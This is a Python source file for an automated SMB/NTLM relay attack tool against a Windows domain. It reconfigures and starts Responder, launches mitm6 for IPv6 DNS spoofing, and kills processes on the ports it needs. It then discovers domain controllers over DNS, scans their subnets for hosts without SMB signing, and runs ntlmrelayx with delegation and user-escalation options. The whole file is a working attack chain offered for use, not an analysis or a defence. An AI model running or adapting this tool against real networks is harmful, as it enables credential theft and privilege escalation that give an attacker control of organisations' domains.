#!/usr/bin/env python3

import argparse
import sys
import os
import re
import asyncio
import dns.resolver
import ipaddress
import netifaces
import signal
import tempfile
import psutil
import socket
from termcolor import colored
from subprocess import Popen, PIPE, run
from datetime import datetime
from netaddr import IPNetwork, AddrFormatError
from pathlib import Path

class AutoRelay:
    def __init__(self, domain, interface=None):
        self.domain = domain
        self.interface = interface or self.get_default_interface()
        self.local_ip = self.get_local_ip()
        self.dcs = set()
        self.relay_targets = set()
        self.processes = []
        self.temp_dir = tempfile.mkdtemp()
        self.log_dir = Path('logs')
        self.log_dir.mkdir(exist_ok=True)

    def get_default_interface(self):
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            for iface in netifaces.interfaces():
                if not iface.startswith('lo'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        return iface
            return None

    def get_local_ip(self):
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

    def kill_port_processes(self, ports):
        """Kill processes using specified ports"""
        for port in ports:
            for proc in psutil.process_iter(['pid', 'name', 'connections']):
                try:
                    for conn in proc.connections():
                        if conn.laddr.port == port:
                            print_info(f"Killing process {proc.name()} using port {port}")
                            proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

    async def setup_services(self):
        """Setup and start required services"""
        try:
            # Kill any processes using required ports
            ports_to_clear = [53, 547, 4444, 80, 445]  # DNS, DHCPv6, Responder ports
            self.kill_port_processes(ports_to_clear)
            
            await asyncio.sleep(1)  # Give processes time to die

            # Configure Responder
            responder_conf = Path('/usr/share/responder/Responder.conf')
            if responder_conf.exists():
                config_data = responder_conf.read_text()
                config_data = re.sub(r'SMB = On', 'SMB = Off', config_data)
                config_data = re.sub(r'HTTP = On', 'HTTP = Off', config_data)
                responder_conf.write_text(config_data)
                print_good("Configured Responder.conf")

            # Start Responder - use correct flags
            resp_cmd = f"responder -I {self.interface} -w -d"
            print_info(f"Starting Responder: {resp_cmd}")
            resp_proc = Popen(resp_cmd.split(), stdout=PIPE, stderr=PIPE)
            self.processes.append(resp_proc)

            await asyncio.sleep(2)  # Give Responder time to start

            # Start mitm6
            mitm6_cmd = f"mitm6 -d {self.domain} -i {self.interface}"
            print_info(f"Starting mitm6: {mitm6_cmd}")
            mitm6_proc = Popen(mitm6_cmd.split(), stdout=PIPE, stderr=PIPE)
            self.processes.append(mitm6_proc)

            return True

        except Exception as e:
            print_bad(f"Error setting up services: {e}")
            return False

    async def scan_host(self, ip):
        """Scan single host for SMB signing"""
        try:
            # First try nmap
            cmd = f"nmap -p445 --script smb-security-mode {ip} -Pn"
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            output = stdout.decode()
            
            if "message_signing: disabled" in output:
                print_good(f"Found relay target via nmap: {ip}")
                return ip

            # Try smbclient if nmap didn't find anything
            cmd = f"smbclient -L //{ip} -N"
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, stderr = await proc.communicate()
            
            if proc.returncode == 0:
                print_good(f"Found accessible SMB target: {ip}")
                return ip

        except Exception as e:
            if "10.85" in str(ip):  # Only print errors for target subnet
                print_bad(f"Error scanning {ip}: {e}")
        return None

    async def discover_dcs(self):
        """Find domain controllers using DNS"""
        try:
            resolver = dns.resolver.Resolver()
            resolver.lifetime = 3
            
            queries = [
                f'_ldap._tcp.dc._msdcs.{self.domain}',
                f'_kerberos._tcp.dc._msdcs.{self.domain}',
                f'_gc._tcp.{self.domain}'
            ]
            
            for query in queries:
                try:
                    answers = resolver.resolve(query, 'SRV')
                    for answer in answers:
                        dc_hostname = str(answer.target).rstrip('.')
                        try:
                            dc_ips = resolver.resolve(dc_hostname, 'A')
                            for ip in dc_ips:
                                if str(ip) not in self.dcs:
                                    self.dcs.add(str(ip))
                                    print_good(f'Found DC: {dc_hostname} ({ip})')
                        except Exception:
                            continue
                except Exception:
                    continue

            print_good(f"Found {len(self.dcs)} Domain Controllers")

        except Exception as e:
            print_bad(f"Error during DC discovery: {e}")

    async def scan_subnet(self, subnet):
        """Scan subnet for relay targets"""
        print_info(f'Scanning subnet {subnet}')
        tasks = []
        
        # Create tasks for each IP in subnet
        for ip in IPNetwork(subnet):
            if str(ip).endswith('.0') or str(ip).endswith('.255'):
                continue
            tasks.append(self.scan_host(str(ip)))

        if tasks:
            chunk_size = 50  # Scan 50 hosts at a time
            for i in range(0, len(tasks), chunk_size):
                chunk = tasks[i:i + chunk_size]
                results = await asyncio.gather(*chunk)
                for result in results:
                    if result:
                        self.relay_targets.add(result)

    async def auto_relay(self):
        """Run the full auto relay chain"""
        try:
            # Setup services
            if not await self.setup_services():
                return

            # Discover DCs
            await self.discover_dcs()
            if not self.dcs:
                print_bad("No Domain Controllers found")
                return

            # Get unique subnets from DCs
            subnets = set()
            for dc in self.dcs:
                try:
                    ip = ipaddress.ip_address(dc)
                    network = ipaddress.ip_network(f'{ip.exploded}/24', strict=False)
                    subnets.add(str(network))
                    print_good(f'Added subnet: {network}')
                except Exception as e:
                    print_bad(f'Error processing subnet: {str(e)}')

            # Scan subnets
            for subnet in subnets:
                await self.scan_subnet(subnet)

            if self.relay_targets:
                print_good(f"Found {len(self.relay_targets)} relay targets")
                
                # Write targets
                targets_file = Path(f"{self.temp_dir}/targets.txt")
                targets_file.write_text('\n'.join(self.relay_targets))
                
                # Start ntlmrelayx
                cmd = (f"ntlmrelayx.py -tf {targets_file} --smb2support "
                      f"--delegate-access --escalate-user")
                print_info(f"Starting ntlmrelayx: {cmd}")
                
                ntlmrelay_proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
                self.processes.append(ntlmrelay_proc)
                
                print_info("Attack chain running. Press Ctrl+C to stop...")
                while True:
                    await asyncio.sleep(1)
            else:
                print_bad("No relay targets found")

        except KeyboardInterrupt:
            print_info("\nReceived interrupt, cleaning up...")
        except Exception as e:
            print_bad(f"Error during attack chain: {e}")
        finally:
            self.cleanup()

    def cleanup(self):
        """Cleanup processes and files"""
        print_info("Cleaning up...")
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        
        try:
            for f in Path(self.temp_dir).glob('*'):
                f.unlink()
            Path(self.temp_dir).rmdir()
        except:
            pass

def parse_args():
    parser = argparse.ArgumentParser(description='Find and auto-attack SMB relay targets')
    parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
    return parser.parse_args()

def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

async def main():
    args = parse_args()
    
    if os.geteuid():
        print_bad('Script must be run as root')
        sys.exit(1)

    if args.auto:
        relay = AutoRelay(args.domain, args.interface)
        await relay.auto_relay()
    else:
        print_bad("Please use --auto for automatic attack chain")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print_info("\nExiting...")
    except Exception as e:
        print_bad(f"Fatal error: {e}")
